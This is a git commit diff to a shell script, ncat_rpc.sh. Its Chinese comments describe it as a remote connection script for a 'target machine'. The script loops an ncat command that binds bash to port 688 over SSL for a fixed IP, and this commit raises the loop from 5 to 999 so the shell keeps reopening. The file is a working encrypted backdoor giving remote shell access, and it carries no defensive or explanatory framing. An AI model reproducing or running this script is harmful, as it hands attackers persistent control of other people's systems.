a0aa7b23c6c4f91ec8afa4a11f12a88df64e96a2
Abraham Vong <73206726+AbrahamTemple@users.noreply.github.com>
2021-08-25 15:49:49 +0800

    Update ncat_rpc.sh

--- nact/ncat_rpc.sh
+++ nact/ncat_rpc.sh
@@ -3,14 +3,14 @@ echo "开始启动远程连接脚本"
 our_ip="172.20.10.12"
 our_port=688
 count=0
-for((i=0;i<5;i++));do       
+for((i=0;i<999;i++));do       
 let count++
 echo "第"+$count+"次请求连接" 
 #后台执行交出bash的远程加密连接命令
 { 
 ncat -c bash --allow $our_ip -vnl $our_port --ssl 
 }&
-wait $! #等待后台执行结束再往下执行
+wait $! #等待上一个子进程后台执行结束再往下执行
 echo "第"+$count+"次断开连接"
 done
 #当靶机的运行内存打满会执行到这里
